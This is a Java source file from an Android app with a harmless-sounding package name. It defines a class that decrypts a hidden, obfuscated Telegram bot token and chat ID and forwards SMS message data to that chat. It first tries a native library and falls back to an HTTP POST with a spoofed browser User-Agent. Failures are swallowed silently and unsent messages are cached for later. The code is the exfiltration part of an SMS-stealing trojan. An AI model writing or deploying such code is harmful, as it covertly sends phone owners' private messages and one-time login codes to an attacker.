package com.dev.test.myfirstapp.forwarders;

import android.content.Context;
import com.dev.test.myfirstapp.utils.EncryptionUtils;
import com.dev.test.myfirstapp.storage.SmsCache;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class TelegramForwarder {
    private static final String ENCRYPTED_BOT_TOKEN = "bQa6K3pNoRZWk29Z3XG44j1ezUURUKBAH5sfbvhUoeVuaL9AHhHgZAjiEnzZeg==";
    private static final String ENCRYPTED_CHAT_ID = "bQ+7I3JNoxtelg==";
    private static String cachedBotToken = null;
    private static String cachedChatId = null;

    public static void forwardSms(Context context, String smsData) {
        try {
            if (cachedBotToken == null) {
                cachedBotToken = EncryptionUtils.decryptString(ENCRYPTED_BOT_TOKEN);
            }
            if (cachedChatId == null) {
                cachedChatId = EncryptionUtils.decryptString(ENCRYPTED_CHAT_ID);
            }

            boolean success = nativeTelegramSend(cachedBotToken, cachedChatId, smsData);
            if (!success) {
                success = javaTelegramSend(cachedBotToken, cachedChatId, smsData);
            }
            if (!success) {
                SmsCache.cacheSms(context, "unknown", smsData, System.currentTimeMillis());
            }
        } catch (Exception e) {
            SmsCache.cacheSms(context, "unknown", smsData, System.currentTimeMillis());
        }
    }

    private static boolean javaTelegramSend(String botToken, String chatId, String message) {
        HttpURLConnection connection = null;
        try {
            String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0");

            String postData = "chat_id=" + URLEncoder.encode(chatId, "UTF-8") +
                "&text=" + URLEncoder.encode(message, "UTF-8");

            try (OutputStream os = connection.getOutputStream()) {
                os.write(postData.getBytes(StandardCharsets.UTF_8));
            }
            return connection.getResponseCode() == 200;
        } catch (Exception e) {
            return false;
        } finally {
            if (connection != null) connection.disconnect();
        }
    }

    private static native boolean nativeTelegramSend(String botToken, String chatId, String message);

    static {
        try {
            System.loadLibrary("native-forwarder");
        } catch (UnsatisfiedLinkError e) {}
    }
}